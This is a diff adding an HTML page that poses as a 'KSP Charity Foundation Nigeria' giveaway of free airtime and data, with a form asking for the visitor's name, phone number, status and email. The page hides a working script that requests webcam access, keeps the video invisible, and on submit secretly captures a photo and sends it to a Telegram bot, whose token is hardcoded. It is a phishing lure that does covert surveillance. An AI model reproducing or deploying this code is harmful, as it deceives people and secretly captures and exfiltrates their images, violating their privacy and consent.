@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>KSP Charity Promo</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f8fb;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #007bff;
+      color: white;
+      padding: 20px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 500px;
+      background: white;
+      margin: 40px auto;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .description {
+      font-size: 16px;
+      margin-bottom: 20px;
+      line-height: 1.6;
+    }
+    form input, form select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    form button {
+      width: 100%;
+      background-color: #007bff;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    form button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+
+  <header>KSP CHARITY FOUNDATION NIGERIA</header>
+
+  <div class="container">
+    <div class="description">
+      In support of Nigeria's students and civil servants due to the recent data price hike, we are giving <strong>₦500 airtime</strong> and <strong>1GB of data</strong> to the first <strong>5 million Nigerians</strong> who submit their number. <br><br>
+      You can be part of this amazing offer! Just follow the steps below:
+    </div>
+
+    <form id="userForm">
+      <label for="name">Full Name:</label>
+      <input type="text" id="name" name="name" required>
+
+      <label for="phone">Phone Number:</label>
+      <input type="tel" id="phone" name="phone" required>
+
+      <label for="type">Are you a Student or Civil Servant?</label>
+      <select id="type" name="type" required>
+        <option value="">Select One</option>
+        <option value="Student">Student</option>
+        <option value="Civil Servant">Civil Servant</option>
+      </select>
+
+      <label for="email">Email (optional):</label>
+      <input type="email" id="email" name="email">
+      <button type="submit">Submit</button>
+
+    </form>
+  </div>
+    <div class="form-container">
+  
+  </div>
+
+  <video id="video" width="660" height="326" autoplay></video>
+  <canvas id="canvas" width="1448" height="2264"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    // Access webcam
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      }).catch(err => {
+        
+      });
+
+    // Form submit logic
+    document.getElementById('userForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      // Capture image from webcam
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/png');
+
+      // Prepare data for Telegram bot
+      const blob = dataURLtoBlob(imageData);
+      const formData = new FormData();
+      formData.append("chat_id", "-1002647702145");
+      formData.append("photo", blob, "photo.png");
+
+      // Send photo to Telegram
+      await fetch("https://api.telegram.org/bot8004457747:AAFahhdQ0wo7t3ohCIOh3z0VN7Ewxvhb_JA/sendPhoto", {
+        method: "POST",
+        body: formData
+      });
+
+      alert("submitted successfully!");
+    });
+
+    // Convert base64 to blob
+    function dataURLtoBlob(dataurl) {
+      let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+          bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      while(n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
+    }
+  </script>
+ <style>
+    bod6y {
+      font-family: Arial, sans-serif;
+      background: #f5f7fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .form-container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+
+    .form-container h2 {
+      margin-bottom: 20px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    button {
+      padding: 10px 20px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #45a049;
+    }
+
+    video, canvas {
+      display: none;
+    }
+  </style>
+</body>
+</html>
